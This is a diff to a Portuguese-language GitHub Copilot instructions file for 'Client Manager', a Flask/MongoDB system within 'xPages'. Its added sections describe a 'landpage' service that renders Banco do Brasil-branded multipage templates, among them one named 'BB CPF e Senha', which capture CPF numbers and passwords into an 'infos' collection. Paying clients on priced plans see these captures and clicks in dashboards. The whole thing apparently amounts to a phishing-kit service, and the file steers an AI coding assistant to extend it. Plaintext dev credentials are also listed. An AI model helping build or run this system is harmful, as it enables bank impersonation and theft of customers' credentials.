@@ -1,8 +1,54 @@
 # Instruções para o GitHub Copilot
 
-Este arquivo contém instruções específicas para o GitHub Copilot ajudar no desenvolvimento do projeto Client Manager, uma aplicação Flask com MongoDB que implementa um sistema MVC + Services para gerenciamento de clientes com múltiplas funcionalidades empresariais.
+Este arquivo contém instruções específicas para o GitHub Copilot ajudar no desenvolvimento do projeto **Client Manager**, uma aplicação Flask com MongoDB que implementa um sistema MVC + Services para gerenciamento de clientes com múltiplas funcionalidades empresariais.
 
-## 🏗️ Arquitetura do Projeto
+## � Contexto do Projeto Atual
+
+### Sistema xPages
+O Client Manager faz parte de um ecossistema maior chamado **xPages** que consiste em:
+
+1. **client_manager** (porta 5000) - Sistema administrativo de gerenciamento
+   - Gestão de clientes, planos, templates, domínios
+   - Dashboard empresarial com estatísticas
+   - Sistema de autenticação e RBAC
+   - API documentada com Swagger/OpenAPI
+
+2. **landpage** (porta 5001) - Sistema de renderização de páginas públicas
+   - Renderiza templates para subdomínios (*.dev.7f000101.nip.io)
+   - Captura de dados via formulários multipágina
+   - Auto-navegação baseada em ordem de páginas
+   - API de salvamento de campos (`/save-fields`)
+
+### Infraestrutura Atual
+
+- **MongoDB**: `localhost` (database: `clientmanager`)
+- **Nginx**: Proxy reverso para `*.dev.7f000101.nip.io` → `localhost:5001`
+- **nip.io**: DNS wildcard (qualquer.dev.7f000101.nip.io → 127.0.0.1)
+- **Templates**: 3 templates BB (Banco do Brasil) com 19 páginas total
+- **Subdomínios ativos**: wwbb01, wwbb02, wwbb03
+
+### Estado Atual da Base de Dados
+
+```javascript
+// Collections MongoDB
+admins: 3 documentos (superadmin, admin1, admin2)
+plans: 3 documentos (Basic R$29.90, Standard R$79.90, Premium R$199.90)
+templates: 3 documentos (BB Fluxo Completo 7pg, BB Sem CPF 6pg, BB CPF e Senha 6pg)
+field_types: 8 documentos (text, email, cpf, phone, etc)
+domains: 1 documento (dev.7f000101.nip.io)
+clients: 3 documentos (cliente1, cliente2, cliente3)
+client_domains: 3 documentos (wwbb01, wwbb02, wwbb03)
+```
+
+### Arquivos Importantes
+
+- **`app/db_init.py`** - Inicialização do banco (criado via heredoc para evitar corrupção)
+- **`app/templates_data.py`** - Definições de templates separadas (23,792 linhas de HTML)
+- **`landpage/app/routes/main.py`** - Renderização de páginas com auto-detecção da primeira página
+- **`docs/INDEX.md`** - Índice completo da documentação
+- **`SISTEMA_COMPLETO.md`** - Documentação detalhada do sistema xPages
+
+## �🏗️ Arquitetura do Projeto
 
 ### Estrutura MVC + Services
 
@@ -25,7 +71,124 @@ Request → Controller → Service → Model → MongoDB
              View → Template → Response
 ```
 
+### Padrões de Template Externos
+
+O sistema usa **templates separados em arquivo Python** (`templates_data.py`) para:
+- Evitar poluição de código
+- Facilitar manutenção de HTML
+- Permitir versionamento separado
+- Melhorar organização do projeto
+
+```python
+# app/templates_data.py
+BB_FLUXO_COMPLETO_PAGES = [
+    {
+        "id": "page_cpf",
+        "name": "Validação de CPF",
+        "title": "🏦 Banco do Brasil",
+        "type": "capture",
+        "order": 1,
+        "field_type": "cpf",
+        "content": "<!-- HTML da página -->"
+    },
+    # ... mais páginas
+]
+
+def get_all_templates():
+    return [
+        {"name": "BB - Fluxo Completo", "pages": BB_FLUXO_COMPLETO_PAGES},
+        # ... mais templates
+    ]
+```
+
 ## 📋 Convenções de Código
+
+### 🚨 Problemas Comuns e Soluções
+
+#### 1. Erro com `@lru_cache` em funções sem parâmetros
+**Problema**: `@lru_cache` não funciona corretamente em funções sem argumentos, pois o cache não consegue diferenciar chamadas.
+
+```python
+# ❌ EVITAR
+@lru_cache(maxsize=32)
+def get_stats():
+    return {"total": 100}
+
+# ✅ CORRETO
+def get_stats():
+    """Stats sem cache ou usar cache manual"""
+    return {"total": 100}
+```
+
+#### 2. Variáveis Jinja2 Undefined
+**Problema**: Template recebe `UndefinedError` quando variável não está no contexto.
+
+```python
+# ❌ EVITAR - Esquecer de passar variável
+context = {
+    "user": user,
+    "stats": stats
+    # recent_logins não está aqui!
+}
+return BaseView.render("template.html", **context)
+
+# ✅ CORRETO - Passar todas as variáveis usadas no template
+context = {
+    "user": user,
+    "stats": stats,
+    "recent_logins": recent_logins,  # Incluir todas!
+    "plan_distribution": plan_distribution,
+}
+return BaseView.render("template.html", **context)
+```
+
+**Checklist para Views**:
+1. ✅ Ler o template e identificar todas as variáveis usadas
+2. ✅ Garantir que todas estão no contexto
+3. ✅ Usar valores padrão (lista vazia, dict vazio) para evitar None
+4. ✅ Adicionar comentários sobre variáveis obrigatórias
+
+#### 3. Corrupção de Arquivos com Docstrings Complexas
+**Problema**: Criar arquivos Python com docstrings contendo caracteres especiais pode causar corrupção.
+
+```bash
+# ❌ EVITAR - create_file com docstrings complexas
+create_file("file.py", content="def func():\n    '''Docstring com 'aspas' e \"mais aspas\"'''")
+
+# ✅ CORRETO - Usar heredoc para arquivos complexos
+cat > file.py << 'ENDFILE'
+def func():
+    """Docstring simples sem problemas"""
+    pass
+ENDFILE
+```
+
+#### 4. Inicialização do Banco de Dados
+**Padrão Atual**: Usar módulo estruturado `db_init.py` com dados externos
+
+```python
+# app/db_init.py
+from app.templates_data import get_all_templates
+
+def initialize_db():
+    """Inicializa banco com verificação de existência"""
+    print("INICIANDO CONFIGURACAO DO BANCO DE DADOS")
+    
+    # Sempre verificar antes de criar
+    if mongo.db.admins.count_documents({}) == 0:
+        create_admins()
+    else:
+        print("Administradores ja existem")
+    
+    # ... outras inicializações
+```
+
+**Regras**:
+- ✅ Verificar existência antes de criar (`count_documents`)
+- ✅ Usar templates externos (`templates_data.py`)
+- ✅ Sempre usar `datetime.utcnow()` para timestamps
+- ✅ Bcrypt para senhas (nunca plaintext)
+- ✅ Print de resumo ao final
 
 ### 1. Estrutura MVC + Services
 
@@ -189,6 +352,79 @@ def admin_action():
 
 ## 🎯 Tarefas Comuns
 
+### 🐛 Debugging: Passo a Passo
+
+#### Problema: Dashboard com erro Jinja2 UndefinedError
+
+**Fluxo de Debugging**:
+1. **Ler o erro completo** - Identificar variável e template
+   ```
+   jinja2.exceptions.UndefinedError: 'stats' is undefined
+   File: admin_enterprise.html, line 38: {{ stats.total_clients }}
+   ```
+
+2. **Verificar Controller** - Onde a variável é criada?
+   ```python
+   # dashboard.py linha 73
+   stats = _get_admin_stats_cached()
+   ```
+
+3. **Verificar View** - Variável está no contexto?
+   ```python
+   # dashboard_view.py
+   context = {
+       "user": user,
+       # "stats": stats,  ← FALTANDO!
+   }
+   ```
+
+4. **Aplicar Fix** - Adicionar ao contexto
+   ```python
+   context = {
+       "user": user,
+       "stats": stats,  # ✅ CORRIGIDO
+   }
+   ```
+
+5. **Verificar Template** - Quais outras variáveis são usadas?
+   ```bash
+   grep -E "\{\{.*\}\}" template.html | grep -v "url_for"
+   ```
+
+6. **Testar** - Reiniciar servidor (Flask debug mode faz auto-reload)
+
+#### Problema: Servidor não Inicia ou Porta em Uso
+
+**Diagnóstico**:
+```bash
+# 1. Verificar processos Python rodando
+ps aux | grep "[p]ython.*run.py"
+
+# 2. Verificar porta 5000
+netstat -tlnp | grep 5000
+
+# 3. Matar processos duplicados
+pkill -9 -f "python.*run.py"
+
+# 4. Limpar e reiniciar
+cd /home/rootkit/Apps/xPages/client_manager
+python run.py > /tmp/client_manager.log 2>&1 &
+
+# 5. Verificar logs
+tail -f /tmp/client_manager.log
+```
+
+#### Problema: MongoDB Connection Error
+
+**Checklist**:
+1. ✅ MongoDB está rodando? `systemctl status mongod`
+2. ✅ Porta 27017 acessível? `nc -zv localhost 27017`
+3. ✅ Config correta? Verificar `config.py`:
+   ```python
+   MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017/clientmanager')
+   ```
+4. ✅ Credenciais? Se usar auth, verificar `.env`
+
 ### Criar Novo Endpoint
 
 Fluxo completo para adicionar um novo endpoint:
@@ -249,6 +485,75 @@ Checklist para novas features:
 6. ✅ **Documentação** - Atualizar Swagger/OpenAPI
 7. ✅ **Navegação** - Atualizar navbar se aplicável
 
+### 🚀 Comandos Úteis do Projeto
+
+#### Inicialização do Sistema
+```bash
+# Client Manager
+cd /home/rootkit/Apps/xPages/client_manager
+python run.py > /tmp/client_manager.log 2>&1 &
+
+# Landpage
+cd /home/rootkit/Apps/xPages/landpage
+python run.py > /tmp/landpage.log 2>&1 &
+
+# Ver logs em tempo real
+tail -f /tmp/client_manager.log
+tail -f /tmp/landpage.log
+```
+
+#### MongoDB Management
+```bash
+# Entrar no MongoDB shell
+mongosh clientmanager
+
+# Queries úteis
+db.admins.find({}, {username: 1, role: 1})
+db.templates.countDocuments()
+db.client_domains.find({}, {subdomain: 1, template_id: 1})
+
+# Limpar coleção específica
+db.infos.deleteMany({})
+
+# Backup
+mongodump --db=clientmanager --out=/tmp/backup
+
+# Restore
+mongorestore --db=clientmanager /tmp/backup/clientmanager
+```
+
+#### Teste de Subdomínios via Nginx
+```bash
+# Testar resposta HTTP
+curl -I http://wwbb01.dev.7f000101.nip.io
+
+# Testar conteúdo
+curl -s http://wwbb01.dev.7f000101.nip.io | grep -E "(title|<h1)"
+
+# Testar todos os subdomínios
+for sub in wwbb01 wwbb02 wwbb03; do
+    echo "=== $sub ==="
+    curl -s http://$sub.dev.7f000101.nip.io | grep "<title>"
+done
+```
+
+#### Desenvolvimento
+```bash
+# Rodar testes
+cd /home/rootkit/Apps/xPages/client_manager
+pytest tests/ -v
+
+# Coverage
+pytest tests/ --cov=app --cov-report=html
+
+# Linting
+flake8 app/ --max-line-length=100
+
+# Criar migration (se usar Alembic)
+flask db migrate -m "Descrição da mudança"
+flask db upgrade
+```
+
 ### Implementar Documentação Swagger
 
 Para cada endpoint, adicionar em `/app/api/swagger.py`:
@@ -289,12 +594,10 @@ def get_resource(resource_id):
 
 ### Core
 - **Flask 2.3.3** - Framework web
-
-### Core
-- **Flask 2.3.3** - Framework web
 - **PyMongo** - Driver MongoDB
 - **Flask-Login** - Gerenciamento de sessões e autenticação
 - **python-dotenv** - Variáveis de ambiente
+- **Bcrypt** - Hashing de senhas (NUNCA usar plaintext!)
 
 ### Validação e API
 - **Pydantic 2.5.0** - Validação de dados e schemas
@@ -304,16 +607,60 @@ def get_resource(resource_id):
 
 ### Segurança
 - **Flask-Limiter 3.5.0** - Rate limiting
-- **Bcrypt** - Hashing de senhas
 - **Flask-WTF** - Proteção CSRF
 
 ### Testes
 - **pytest 7.4.3** - Framework de testes
 - **pytest-cov 4.1.0** - Coverage de testes
 
+### 🔧 Configuração Atual
+
+```python
+# config.py (exemplo)
+class Config:
+    SECRET_KEY = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
+    MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017/clientmanager')
+    
+    # Flask-Login
+    REMEMBER_COOKIE_DURATION = timedelta(days=7)
+    SESSION_COOKIE_SECURE = False  # True em produção com HTTPS
+    
+    # Rate Limiting
+    RATELIMIT_DEFAULT = "200 per day, 50 per hour"
+    RATELIMIT_STORAGE_URL = "memory://"
+```
+
 Ao usar estas bibliotecas, **sempre siga os padrões existentes** no projeto.
 
 ## 🎨 Estrutura de Templates
+
+### Landpage: Sistema de Auto-Navegação
+
+O sistema landpage tem um padrão especial para navegação automática:
+
+```python
+# landpage/app/routes/main.py
+@main.route('/<subdomain>/', defaults={'page_id': None})
+@main.route('/<subdomain>/<page_id>')
+def render_page(subdomain, page_id=None):
+    # Se page_id é None, encontra primeira página por order
+    if page_id is None:
+        pages = template_doc.get("pages", [])
+        if pages:
+            first_page = min(pages, key=lambda x: x.get("order", 999))
+            page_id = first_page["id"]
+    
+    # Renderizar página específica
+    return render_template('page.html', page_data=page_data)
+```
+
+**Características**:
+- Auto-detecção da primeira página (menor `order`)
+- `page_id` opcional na URL
+- Redirect automático para primeira página
+- `window.pageData.nextPage` populado no cliente
+
+### Client Manager: Templates Administrativos
 
 Templates HTML seguem este padrão consistente:
 
@@ -791,12 +1138,58 @@ def get_cached_stats(client_id: str, ttl: int = 300):
 
 ## 📚 Recursos e Documentação
 
-### Documentação Interna
+### 📂 Documentação Interna (Reorganizada!)
 
-- [`docs/ARCHITECTURE.md`](../docs/ARCHITECTURE.md) - Arquitetura completa
-- [`docs/SWAGGER_IMPLEMENTATION.md`](../docs/SWAGGER_IMPLEMENTATION.md) - Implementação API
-- [`docs/TEMPLATE_FIELDS_SYSTEM.md`](../docs/TEMPLATE_FIELDS_SYSTEM.md) - Sistema de templates
-- [`docs/README.md`](../docs/README.md) - Índice de documentação
+**Raiz** (apenas essenciais):
+- [`README.md`](../README.md) - Overview do projeto
+- [`CHANGELOG.md`](../CHANGELOG.md) - Histórico de versões
+- [`CODE_OF_CONDUCT.md`](../CODE_OF_CONDUCT.md) - Código de conduta
+
+**docs/** (toda documentação técnica):
+- **[`INDEX.md`](../docs/INDEX.md)** - 🆕 Índice completo da documentação
+- [`ARCHITECTURE.md`](../docs/ARCHITECTURE.md) - Arquitetura completa do sistema
+- [`API_QUICK_REFERENCE.md`](../docs/API_QUICK_REFERENCE.md) - Referência rápida da API
+- [`SWAGGER_IMPLEMENTATION.md`](../docs/SWAGGER_IMPLEMENTATION.md) - Implementação Swagger/OpenAPI
+- [`ROUTES_DOCUMENTATION.md`](../docs/ROUTES_DOCUMENTATION.md) - Documentação de todas as rotas
+- [`TEMPLATE_FIELDS_SYSTEM.md`](../docs/TEMPLATE_FIELDS_SYSTEM.md) - Sistema de templates e campos
+- [`DASHBOARD_README.md`](../docs/DASHBOARD_README.md) - Guia do dashboard administrativo
+- [`SCRIPTS_DOCUMENTATION.md`](../docs/SCRIPTS_DOCUMENTATION.md) - Documentação dos scripts
+- [`AWS_DEPLOYMENT.md`](../docs/AWS_DEPLOYMENT.md) - Deploy completo na AWS
+- [`AZURE_DEPLOYMENT.md`](../docs/AZURE_DEPLOYMENT.md) - Deploy completo no Azure
+- [`MIGRATION_GUIDE.md`](../docs/MIGRATION_GUIDE.md) - Guia de migração
+- [`MODERNIZATION_SUMMARY.md`](../docs/MODERNIZATION_SUMMARY.md) - Resumo da modernização
+
+**Raiz do workspace xPages**:
+- [`SISTEMA_COMPLETO.md`](../../SISTEMA_COMPLETO.md) - Documentação completa do sistema xPages
+
+### 🔗 Acessos Rápidos
+
+**Desenvolvimento Local**:
+- Client Manager: http://localhost:5000
+- Landpage: http://localhost:5001
+- Swagger UI: http://localhost:5000/api/docs
+- Dashboard Admin: http://localhost:5000/dashboard
+
+**Subdomínios (via nginx)**:
+- wwbb01: http://wwbb01.dev.7f000101.nip.io (BB Fluxo Completo - 7 páginas)
+- wwbb02: http://wwbb02.dev.7f000101.nip.io (BB Sem CPF - 6 páginas)
+- wwbb03: http://wwbb03.dev.7f000101.nip.io (BB CPF e Senha - 6 páginas)
+
+### 📝 Credenciais de Desenvolvimento
+
+**Admins**:
+```
+superadmin / SuperAdmin123!
+admin1 / Admin123!
+admin2 / Admin123!
+```
+
+**Clientes**:
+```
+cliente1 / Senha123!
+cliente2 / Senha123!
+cliente3 / Senha123!
+```
 
 ### Links Externos Úteis
 
@@ -808,18 +1201,54 @@ def get_cached_stats(client_id: str, ttl: int = 300):
 
 ## 🎯 Diretrizes de Implementação
 
+### ⚠️ Erros Críticos a Evitar
+
+1. **NUNCA usar `@lru_cache` em funções sem parâmetros**
+   - Problema: Cache não consegue diferenciar chamadas
+   - Solução: Remover decorator ou implementar cache manual
+
+2. **SEMPRE verificar variáveis no contexto Jinja2**
+   - Problema: `UndefinedError` quebra a página
+   - Solução: Grep no template antes de renderizar
+   ```bash
+   grep -E "\{\{.*\}\}" template.html | grep -v "url_for\|csrf_token"
+   ```
+
+3. **NUNCA criar arquivos Python grandes com create_file**
+   - Problema: Corrupção de arquivos com docstrings complexas
+   - Solução: Usar heredoc para arquivos grandes
+   ```bash
+   cat > file.py << 'ENDFILE'
+   # conteúdo aqui
+   ENDFILE
+   ```
+
+4. **SEMPRE usar bcrypt para senhas**
+   - Problema: Segurança comprometida
+   - Solução: `bcrypt.hashpw(password.encode(), bcrypt.gensalt())`
+
+5. **SEMPRE verificar existência antes de criar no MongoDB**
+   - Problema: Duplicatas no banco
+   - Solução: `if collection.count_documents({}) == 0: create()`
+
+6. **SEMPRE passar TODAS as variáveis que o template usa**
+   - Problema: Template quebra com UndefinedError
+   - Solução: Fazer checklist de variáveis do template
+
 ### Ao Criar Código, Sempre:
 
 1. ✅ **Adicionar type hints** em todos os parâmetros e retornos
 2. ✅ **Escrever docstrings** descritivas
 3. ✅ **Validar entradas** de usuários
-4. ✅ **Tratar exceções** apropriadamente
-5. ✅ **Usar logging** para debug
+4. ✅ **Tratar exceções** apropriadamente com try/except
+5. ✅ **Usar logging** para debug (não apenas print)
 6. ✅ **Seguir princípios SOLID**
 7. ✅ **Escrever testes** para novo código
 8. ✅ **Documentar no Swagger** se for endpoint API
-9. ✅ **Auditar ações** sensíveis
-10. ✅ **Verificar permissões** (RBAC)
+9. ✅ **Auditar ações** sensíveis via AuditService
+10. ✅ **Verificar permissões** (RBAC) com decorators
+11. ✅ **Usar datetime.utcnow()** para timestamps (nunca now())
+12. ✅ **Verificar None** antes de acessar propriedades
 
 ### Ao Revisar Código, Verificar:
 
@@ -831,6 +1260,241 @@ def get_cached_stats(client_id: str, ttl: int = 300):
 6. ✅ Não quebra funcionalidades existentes
 7. ✅ Logs de auditoria apropriados
 8. ✅ Tratamento de erros robusto
+9. ✅ Todas as variáveis Jinja2 estão no contexto
+10. ✅ Não usa `@lru_cache` incorretamente
+
+### 🔍 Checklist de Debug
+
+Quando encontrar um erro:
+
+1. **Ler erro completo** - Não pular para conclusões
+2. **Identificar o arquivo e linha** - Ir direto ao problema
+3. **Verificar contexto** - Ler 10 linhas antes e depois
+4. **Procurar padrões** - Já vimos este erro antes?
+5. **Testar hipótese** - Fazer uma mudança de cada vez
+6. **Verificar logs** - Sempre olhar `/tmp/*.log`
+7. **Testar isoladamente** - Reproduzir em ambiente limpo
+8. **Documentar solução** - Atualizar este arquivo se necessário
+
+## 💡 Exemplos Práticos
+
+### Exemplo 1: Controller com View Context Correto
+
+```python
+# app/controllers/dashboard.py
+@dashboard.route("/admin")
+@login_required
+@admin_required
+def admin_dashboard():
+    """Dashboard administrativo com todas as variáveis necessárias"""
+    user = User.get_by_id(current_user.id)
+    
+    # Coletar todas as estatísticas
+    stats = _get_admin_stats_cached()
+    stats["inactive_clients"] = stats["total_clients"] - stats["active_clients"]
+    
+    # Coletar dados auxiliares
+    recent_logins = LoginLog.get_recent_logins(limit=10)
+    plan_distribution = _get_plan_distribution_cached()
+    client_activity = Client.get_recent_activity()
+    new_clients = Client.count_new_this_month()
+    new_infos = Info.count_new_this_month()
+    recent_clicks = Click.get_recent(limit=10)
+    
+    # ✅ IMPORTANTE: Passar TODAS as variáveis que o template usa
+    return DashboardView.render_admin_dashboard(
+        user=user,
+        stats=stats,                      # Template usa {{ stats.total_clients }}
+        recent_logins=recent_logins,      # Template usa {% for login in recent_logins %}
+        plan_distribution=plan_distribution,
+        client_activity=client_activity,
+        new_clients=new_clients,          # Template usa {{ new_clients }}
+        new_infos=new_infos,              # Template usa {{ new_infos }}
+        recent_clicks=recent_clicks       # Template usa {{ recent_clicks|length }}
+    )
+```
+
+```python
+# app/views/dashboard_view.py
+class DashboardView(BaseView):
+    @staticmethod
+    def render_admin_dashboard(user, stats, recent_logins, plan_distribution,
+                               client_activity, new_clients, new_infos, recent_clicks=None):
+        """Renderiza dashboard com TODAS as variáveis necessárias"""
+        
+        # ✅ Contexto completo incluindo todas as variáveis
+        context = {
+            "user": user,
+            "user_type": "admin",
+            "stats": stats,                    # Usado no template
+            "recent_logins": recent_logins,    # Usado no template
+            "plan_distribution": plan_distribution,
+            "client_activity": client_activity,
+            "new_clients": new_clients,
+            "new_infos": new_infos,
+            "recent_clicks": recent_clicks or [],
+            # Variáveis legacy para compatibilidade
+            "client_count": stats.get("total_clients", 0),
+            "active_clients": stats.get("active_clients", 0),
+        }
+        
+        return BaseView.render("dashboard/admin_enterprise.html", **context)
+```
+
+### Exemplo 2: Inicialização Segura do Banco
+
+```python
+# app/db_init.py
+from datetime import datetime
+import bcrypt
+from app import mongo
+from app.templates_data import get_all_templates
+
+def initialize_db():
+    """
+    Inicializa banco de dados com verificação de existência.
+    ✅ Segue padrão: verificar antes de criar
+    """
+    print("\n" + "="*80)
+    print("INICIANDO CONFIGURACAO DO BANCO DE DADOS")
+    print("="*80 + "\n")
+    
+    db = mongo.db
+    
+    # ✅ SEMPRE verificar existência
+    if db.admins.count_documents({}) == 0:
+        create_admins()
+    else:
+        print("Administradores ja existem")
+    
+    if db.plans.count_documents({}) == 0:
+        create_plans()
+    else:
+        print("Planos ja existem")
+    
+    # Templates vem de arquivo externo
+    if db.templates.count_documents({}) == 0:
+        create_templates()
+    else:
+        print("Templates ja existem")
+    
+    print_summary()
+
+def create_admins():
+    """Cria administradores com senhas criptografadas"""
+    db = mongo.db
+    
+    admins_data = [
+        {
+            "username": "superadmin",
+            "password": "SuperAdmin123!",  # Será hashado
+            "role": "super_admin",
+            "email": "superadmin@example.com"
+        },
+        # ... mais admins
+    ]
+    
+    for admin_data in admins_data:
+        # ✅ SEMPRE usar bcrypt para senhas
+        password_hash = bcrypt.hashpw(
+            admin_data["password"].encode(),
+            bcrypt.gensalt()
+        )
+        
+        admin = {
+            "username": admin_data["username"],
+            "password": password_hash,
+            "role": admin_data["role"],
+            "email": admin_data["email"],
+            "status": "active",
+            "createdAt": datetime.utcnow(),  # ✅ UTC!
+            "updatedAt": datetime.utcnow()
+        }
+        
+        db.admins.insert_one(admin)
+    
+    print(f"✓ {len(admins_data)} administradores criados")
+
+def create_templates():
+    """Cria templates a partir de arquivo externo"""
+    db = mongo.db
+    
+    # ✅ Templates em arquivo separado
+    all_templates = get_all_templates()
+    
+    for template_data in all_templates:
+        template = {
+            "name": template_data["name"],
+            "description": template_data.get("description", ""),
+            "pages": template_data["pages"],
+            "createdAt": datetime.utcnow(),
+            "updatedAt": datetime.utcnow()
+        }
+        
+        db.templates.insert_one(template)
+    
+    print(f"✓ {len(all_templates)} templates criados")
+```
+
+### Exemplo 3: Tratamento de Erros Robusto
+
+```python
+# app/models/client.py
+from typing import Tuple, Optional, Dict
+from bson.objectid import ObjectId
+from datetime import datetime
+
+class Client:
+    collection_name = 'clients'
+    
+    @staticmethod
+    def create(username: str, email: str, plan_id: str) -> Tuple[bool, str]:
+        """
+        Cria novo cliente com validação e tratamento de erros.
+        
+        Returns:
+            Tuple[bool, str]: (sucesso, id_ou_mensagem_erro)
+        """
+        try:
+            # ✅ Validar entrada
+            if not username or len(username) < 3:
+                return False, "Username deve ter pelo menos 3 caracteres"
+            
+            if not email or '@' not in email:
+                return False, "Email inválido"
+            
+            # ✅ Verificar duplicatas
+            existing = mongo.db[Client.collection_name].find_one({
+                "username": username
+            })
+            if existing:
+                return False, "Username já existe"
+            
+            # ✅ Validar ObjectId
+            try:
+                plan_obj_id = ObjectId(plan_id)
+            except Exception:
+                return False, "Plan ID inválido"
+            
+            # Criar documento
+            new_client = {
+                "username": username,
+                "email": email,
+                "plan_id": plan_obj_id,
+                "status": "active",
+                "createdAt": datetime.utcnow(),
+                "updatedAt": datetime.utcnow()
+            }
+            
+            result = mongo.db[Client.collection_name].insert_one(new_client)
+            return True, str(result.inserted_id)
+            
+        except Exception as e:
+            # ✅ Log do erro completo
+            import traceback
+            traceback.print_exc()
+            return False, f"Erro ao criar cliente: {str(e)}"
+```
 
 ## 💡 Exemplos Práticos
 
@@ -1597,21 +2261,86 @@ class TestResourceService:
 
 ## 📌 Resumo para o GitHub Copilot
 
-Ao trabalhar neste projeto:
+### 🎯 Objetivo Principal
+Ajudar no desenvolvimento do **Client Manager** (sistema xPages), fornecendo código que:
+- ✅ Segue arquitetura MVC + Services
+- ✅ É seguro (RBAC, validações, bcrypt)
+- ✅ Tem tratamento de erros robusto
+- ✅ Está documentado (docstrings, Swagger)
+- ✅ É testável e mantível
 
-1. **Sempre siga a arquitetura MVC + Services** estabelecida
-2. **Use type hints** em todo o código Python
-3. **Escreva docstrings** descritivas para funções públicas
-4. **Implemente testes** para todo código novo
-5. **Documente endpoints** no Swagger/OpenAPI
-6. **Valide entradas** de usuários com Pydantic
-7. **Audite ações** sensíveis com AuditService
-8. **Verifique permissões** com decorators RBAC
-9. **Trate exceções** apropriadamente
-10. **Siga convenções** de código estabelecidas
+### 🚨 Erros Críticos NUNCA Repetir
 
-**O objetivo é código limpo, testável, seguro e bem documentado que se integre perfeitamente com a arquitetura existente.**
+1. **`@lru_cache` em funções sem parâmetros** → Remover ou usar cache manual
+2. **Variáveis Jinja2 faltando no contexto** → Grep template antes de renderizar
+3. **Senhas em plaintext** → SEMPRE usar bcrypt
+4. **Criar sem verificar existência** → `count_documents()` primeiro
+5. **Arquivos grandes com create_file** → Usar heredoc
+6. **Esquecer variáveis no View context** → Passar TODAS que o template usa
+
+### 🔧 Estado Atual do Sistema
+
+**Infraestrutura**:
+- Client Manager: `localhost:5000` (Flask + MongoDB)
+- Landpage: `localhost:5001` (Flask + Jinja2)
+- MongoDB: `localhost:27017/clientmanager`
+- Nginx: Proxy para `*.dev.7f000101.nip.io`
+
+**Base de Dados**:
+- 3 admins (superadmin, admin1, admin2)
+- 3 planos (Basic, Standard, Premium)
+- 3 templates BB (19 páginas total)
+- 3 clientes e 3 subdomínios ativos
+
+**Arquivos Importantes**:
+- `app/db_init.py` - Inicialização estruturada
+- `app/templates_data.py` - Definições de templates (23K linhas)
+- `docs/INDEX.md` - Índice completo da documentação
+- `SISTEMA_COMPLETO.md` - Documentação do ecossistema
+
+### 🚀 Comandos Rápidos
+
+```bash
+# Iniciar servers
+cd /home/rootkit/Apps/xPages/client_manager && python run.py &
+cd /home/rootkit/Apps/xPages/landpage && python run.py &
+
+# Ver logs
+tail -f /tmp/client_manager.log
+tail -f /tmp/landpage.log
+
+# MongoDB
+mongosh clientmanager
+db.templates.find({}, {name: 1})
+
+# Testes
+pytest tests/ -v --cov=app
+
+# Debug de subdomínios
+curl -I http://wwbb01.dev.7f000101.nip.io
+```
+
+### 📚 Documentação Principal
+
+1. **[docs/INDEX.md](../docs/INDEX.md)** - Início aqui!
+2. **[ARCHITECTURE.md](../docs/ARCHITECTURE.md)** - Arquitetura completa
+3. **[API_QUICK_REFERENCE.md](../docs/API_QUICK_REFERENCE.md)** - Referência rápida
+4. **[SISTEMA_COMPLETO.md](../../SISTEMA_COMPLETO.md)** - Sistema xPages completo
+
+### 🎓 Princípios de Desenvolvimento
+
+1. **Segurança primeiro** - RBAC, validações, bcrypt, auditoria
+2. **Código limpo** - Type hints, docstrings, SOLID
+3. **Testes sempre** - Coverage mínimo 80%
+4. **Documentação completa** - Swagger, README, comentários
+5. **Performance importa** - Cache inteligente, queries otimizadas
+6. **Erros esperados** - Try/except robusto, mensagens claras
 
 ---
 
-Estas instruções devem ajudar o GitHub Copilot a gerar sugestões mais alinhadas com a arquitetura, padrões de código, e práticas de desenvolvimento do projeto Client Manager.
+**O objetivo é código limpo, testável, seguro e bem documentado que se integre perfeitamente com a arquitetura existente do sistema xPages.**
+
+---
+
+*Última atualização: 12 de outubro de 2025*
+*Estas instruções devem ajudar o GitHub Copilot a gerar sugestões mais alinhadas com a arquitetura, padrões de código, e práticas de desenvolvimento do projeto Client Manager.*
